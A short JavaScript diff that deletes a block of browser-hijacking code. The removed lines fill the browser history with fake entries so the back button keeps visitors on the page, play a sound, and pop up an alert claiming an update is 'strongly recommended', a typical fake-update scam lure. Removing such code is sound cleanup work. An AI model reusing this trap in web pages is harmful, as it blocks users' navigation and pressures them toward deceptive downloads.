@@ -12,23 +12,6 @@
     }
   });
 })();
-(function(history, location, newState) {
-  history.replaceState(null, newState.title, "?rzi=1431028&rsz=1431028&rid=");
-})(history, location, document);
-/** @type {string} */
-var fakepath = document.URL;
-window.history.pushState("index.php", "gogogo", fakepath);
-window.history.pushState("index.php", "disone", fakepath);
-window.addEventListener("popstate", function(dataAndEvents) {
-  if (document.URL.indexOf(fakepath) >= 0) {
-    window.history.pushState("index.php", "gogogo", fakepath);
-    window.history.pushState("index.php", "disone", fakepath);
-    if (document.getElementById("snd")) {
-      document.getElementById("snd").play();
-    }
-    alert("Update is strongly recommended!");
-  }
-});
 (function(win, doc) {
   /**
    * @return {undefined}
